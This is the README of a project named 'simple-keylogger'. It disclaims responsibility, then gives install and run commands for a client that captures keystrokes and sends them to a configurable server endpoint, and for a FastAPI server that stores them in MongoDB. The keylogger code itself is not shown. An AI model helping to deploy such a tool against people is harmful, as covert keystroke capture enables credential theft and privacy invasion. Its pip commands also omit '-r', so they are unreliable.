# simple-keylogger
## I am not responsible for what can be done with this program.

# To use this program, the following steps must be carried out

## Client
you have to move to the client folder and type

### Windows
```
pip install requirements.txt
python main.py
```
### Linux/Mac
```
pip3 install requirements.txt
python3 main.py
```
## Configure the parameters in archive config.py
```
class Config:
    filename = "keys.json"
    server = "http://localhost:8000/keys"
```

## Server

you have to move to the server folder and type

### Windows
```
pip install requirements.txt
uvicorn main:app --reload
```
### Linux/Mac
```
pip3 install requirements.txt
uvicorn main:app --reload
```
## Configure the parameters in archive config.py
```
class Config:
    client = "mongodb://localhost:27017/"
    db = "keylogger"
    collection = "keys"
```




